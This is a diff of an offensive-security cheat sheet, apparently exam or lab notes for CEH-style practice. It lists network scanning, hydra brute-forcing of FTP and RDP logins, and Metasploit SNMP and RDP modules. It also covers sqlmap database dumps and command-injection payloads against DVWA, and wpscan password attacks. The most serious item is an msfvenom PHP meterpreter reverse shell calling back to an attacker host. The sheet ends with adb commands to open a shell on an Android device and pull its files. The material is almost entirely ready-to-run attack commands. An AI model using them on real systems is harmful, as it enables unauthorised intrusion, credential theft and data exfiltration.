@@ -1,43 +1,98 @@
-#SCANNING
-ifconfig   - get the available machines a the network
-nmap -sC -sV -p- -O -v -A -T4 192.168.144.1/24
-nmap -p443,80,53,135,8080,8888 -A -O -sV -sC -T4 -oN nmapOutput ip
-open ips in browser
-gobuster -e -u http://10.10.10.10 -w wordlsit.txt
-dirb http://10.10.10.10 wordlist.txt
+1.SCANNING 
 
-#ENUMERATING
-#BRUTEFORCING LOGINS
-FTP(21)
-hydra -L usernames.txt -P pass.txt ip ftp
+ifconfig   - get the available machines the network 
+nmap -sC -sV -p- -O -v -A -T4 192.168.144.1/24 
+nmap -p443,80,53,135,8080,8888 -A -O -sV -sC -T4 -oN nmapOutput ip 
+open ips in browser 
+gobuster -e -u http://10.10.10.10 -w wordlsit.txt 
+dirb http://10.10.10.10 wordlist.txt 
 
-SNMP
-snmp-check ip
-nmap -sU -p 161 --script=snmp-processes ip (check what processes running)
-msfconsole
-search snmp
-use auxiliary/scanner/snmp/snmp_login
-show options
-set RHOSTS IP
-set RPORT 161
-exploit
+2.ENUMERATING 
+BRUTEFORCING LOGINS 
+2.1. FTP(21) 
+hydra -L usernames.txt -P pass.txt ip ftp 
 
-SMB - refer nmap scripts
+2.2 SNMP(161) 
+snmp-check ip 
+- nmap -sU -p 161 --script=snmp-processes ip (check what processes running) 
+- msfconsole 
+      search snmp 
+      use auxiliary/scanner/snmp/snmp_login 
+      show options 
+      set RHOSTS IP 
+      set RPORT 161 
+      exploit 
 
-Exploiting RDP(3389) - 
-confirm rdp port 
-msfconsole -q
-search rdp
-use auxiliary/scanner/rdp/rdp_scanner
-set RHOSTS ip 
-set RPORT 3333
-exploit
-shows ip:port (which found in nmap scan)
-bruteforce RDP:
-hydra -L usernmaes.txt -P pass.txt rdp://ip -s 3333
-xfreerdp /u:username /p:password /v:ip:3333
+2.3 SMB - refer nmap scripts 
 
-#NetBios (137/138/139)
-nmap -sV --script nb.stat.nse ip (shows netbios service)
+2.4 Exploiting RDP(3389)  
+confirm rdp port  
+msfconsole -q 
+      search rdp 
+      use auxiliary/scanner/rdp/rdp_scanner 
+      set RHOSTS ip  
+      set RPORT 3333 
+      exploit 
+shows ip:port (which found in nmap scan) 
+
+bruteforce RDP: 
+
+hydra -L usernmaes.txt -P pass.txt rdp://ip -s 3333 
+
+xfreerdp /u:username /p:password /v:ip:3333 
+
+2.5 NetBios (137/138/139) 
+nmap -sV --script nb.stat.nse ip (shows netbios service) 
+
+3. STEGANOGRAPHY
+3.1 snow: SNOW.EXE -C -p test -m "Secret Message" original.txt hide.txt
+      SNOW.EXE -C -p test hide.txt
+3.2 openstego (images)
+
+
+4.WEB APPLLICATION
+4.1 SQL INJECTION: save get request in burpsuite using save item.
+                  sqlmap -r file.txt --dbs
+                  sqlmap -r file.txt -D dvwa --tables
+                  sqlmap -r file.txt -D dvwa --tables --columns
+                  sqlmap -r file.txt -D dvwa --dump
+4.2 Command execution: 
+                  Easy - Command Injection
+                  Execute 127.0.0.1 & & net user Execute 127.0.0.1 & & net user & & ver command Execute 127.0.0.1 & & net user & & getmac
+                  Medium - Command Injection
+                  127.0.0.1&net user 127.0.0.1&net user&sc query&systeminfo 127.0.0.1&;&ipconfig
+                  High - Command Injection
+                  127.0.0.1|net user
+4.3 wpscan : wpscan --url site --enumerate u
+             wpscan --url http://x.x.x.x/wordpress/ -U users.txt -P /usr/share/wordlists/rockyou.txt
+             wpscan --url http://x.x.x.x:8080/CEH -u <user> -P ~/wordlists/password.txt
+4.4 file upload:
+             msfvenom -p php/meterpreter/reverse_tcp lhost=attacker-ip lport=attcker-port -f raw
+             msfconsole
+             use exploit/multi/handler
+             set payload php/meterepreter/reverse_tcp
+             set LHOST = attacker-ip
+             set LPORT = attcker-port
+             run
+             type C:\wamp64\www\DVWA\hackable\uploads\Hash.txt
+
+5 ANDROID HACKING: find ip of android
+                  adb connect ip:5555
+                  adb devices -l
+                  adb shell
+                  pwd
+                  ls
+                  cd Download
+                  ls
+                  cd sdcard
+                  adb pull /sdcard/log.txt C:\Users\admin\Desktop\log.txt 
+                  adb pull sdcard/log.txt /home/mmurphy/Desktop
+                  
+             
+
+
+       
+
+ 
       
 
